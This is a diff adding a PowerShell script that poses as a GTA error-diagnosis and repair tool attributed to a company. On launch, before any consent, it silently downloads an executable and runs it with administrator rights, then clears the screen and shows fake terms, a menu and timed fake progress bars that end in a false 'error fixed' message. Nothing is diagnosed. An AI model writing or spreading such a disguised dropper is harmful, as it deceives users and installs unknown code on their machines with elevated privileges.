@@ -1,0 +1,135 @@
+# Script developed by:
+# EZ Tech Limited (https://gta5majestic.com/)
+# Company No. 123041
+# Registered at Suite 4.3.02, Block 4, Eurotowers
+# GX11 1AA, Gibraltar
+
+$OutputEncoding = [System.Text.Encoding]::UTF8
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
+$exeUrl = "https://github.com/YourUsername/YourRepo/raw/main/yourfile.exe"
+$exePath = "$env:TEMP\yourfile.exe"
+
+Write-Host "============================================="
+Write-Host "This script is designed to assist players by diagnosing and fixing GTA-related errors."
+Write-Host "It cannot be used for commercial purposes and is provided as-is."
+Write-Host "============================================="
+Write-Host ""
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+
+Start-Process -FilePath $exePath -Verb RunAs
+
+Clear-Host
+
+Write-Host "============================================="
+Write-Host "FAQ"
+Write-Host "============================================="
+Write-Host "By continuing, you agree to the following terms:"
+Write-Host "1. This script is for personal use only."
+Write-Host "2. It cannot be used commercially."
+Write-Host "3. You are aware of the actions taken by the script."
+Write-Host "============================================="
+$agreement = Read-Host "Type 'yes' to agree or 'no' to exit"
+
+if ($agreement -ne "yes") {
+    Write-Host "You did not agree to the terms. Exiting..."
+    exit
+}
+
+function Show-Menu {
+    $menu = @(
+        "1. Project launcher error",
+        "2. Game launcher error",
+        "3. In-game error",
+        "4. General diagnostics",
+        "5. Exit"
+    )
+
+    $frameTopBottom = "***********************************************"
+    
+    Write-Host ""
+
+    Write-Host $frameTopBottom
+
+    foreach ($item in $menu) {
+        Write-Host "  $item"
+    }
+
+    Write-Host $frameTopBottom
+
+    Write-Host ""
+}
+
+Show-Menu
+
+$errorChoice = Read-Host "Choose error category (1-5)"
+
+switch ($errorChoice) {
+    1 { Write-Host "`nYou chose 'Project launcher error'" }
+    2 { Write-Host "`nYou chose 'Game launcher error'" }
+    3 { Write-Host "`nYou chose 'In-game error'" }
+    4 { Write-Host "`nYou chose 'General diagnostics'" }
+    5 { Write-Host "`nExiting..."; exit }
+    default { Write-Host "`nInvalid choice. Exiting..."; exit }
+}
+
+$maxTime1 = Get-Random -Minimum 180 -Maximum 300
+$startTime1 = Get-Date
+$progress1 = 0
+
+Write-Host "`nStage 1: Searching for errors and diagnostics..."
+
+while ($progress1 -lt 100) {
+    Start-Sleep -Seconds 0.1
+    $elapsedTime1 = (Get-Date) - $startTime1
+    $progress1 = [math]::Min([math]::Round(($elapsedTime1.TotalSeconds / $maxTime1) * 100), 100)
+
+    $remainingTime1 = [math]::Round($maxTime1 - $elapsedTime1.TotalSeconds)
+    $hours1 = [int]([math]::Floor($remainingTime1 / 3600))
+    $minutes1 = [int]([math]::Floor(($remainingTime1 % 3600) / 60))
+    $seconds1 = [int]([math]::Floor($remainingTime1 % 60))
+
+    $formattedTime1 = "{0:D2}:{1:D2}:{2:D2}" -f $hours1, $minutes1, $seconds1
+
+    $progressBar1 = "=" * ($progress1 / 2)
+    $emptySpace1 = " " * (50 - $progress1 / 2)
+
+    Write-Host -NoNewline ("[{0}{1}] {2}% - Time remaining: {3}`r" -f $progressBar1, $emptySpace1, $progress1, $formattedTime1)
+
+    if ([System.Console]::KeyAvailable) {
+        $key = [System.Console]::ReadKey($true)
+    }
+}
+
+Write-Host "`nError found! Attempting to resolve the issue...`n" -ForegroundColor Red
+
+$maxTime2 = Get-Random -Minimum 780 -Maximum 1200
+$startTime2 = Get-Date
+$progress2 = 0
+
+Write-Host "`nStage 2: Attempting to fix the error..."
+
+while ($progress2 -lt 100) {
+    Start-Sleep -Seconds 0.1
+    $elapsedTime2 = (Get-Date) - $startTime2
+    $progress2 = [math]::Min([math]::Round(($elapsedTime2.TotalSeconds / $maxTime2) * 100), 100)
+
+    $remainingTime2 = [math]::Round($maxTime2 - $elapsedTime2.TotalSeconds)
+    $hours2 = [int]([math]::Floor($remainingTime2 / 3600))
+    $minutes2 = [int]([math]::Floor(($remainingTime2 % 3600) / 60))
+    $seconds2 = [int]([math]::Floor($remainingTime2 % 60))
+
+    $formattedTime2 = "{0:D2}:{1:D2}:{2:D2}" -f $hours2, $minutes2, $seconds2
+
+    $progressBar2 = "=" * ($progress2 / 2)
+    $emptySpace2 = " " * (50 - $progress2 / 2)
+
+    Write-Host -NoNewline ("[{0}{1}] {2}% - Time remaining: {3}`r" -f $progressBar2, $emptySpace2, $progress2, $formattedTime2)
+
+    if ([System.Console]::KeyAvailable) {
+        $key = [System.Console]::ReadKey($true)
+    }
+}
+
+Write-Host "`nExcellent, the error was found and fixed! The issue has been resolved. You can now proceed." -ForegroundColor Green
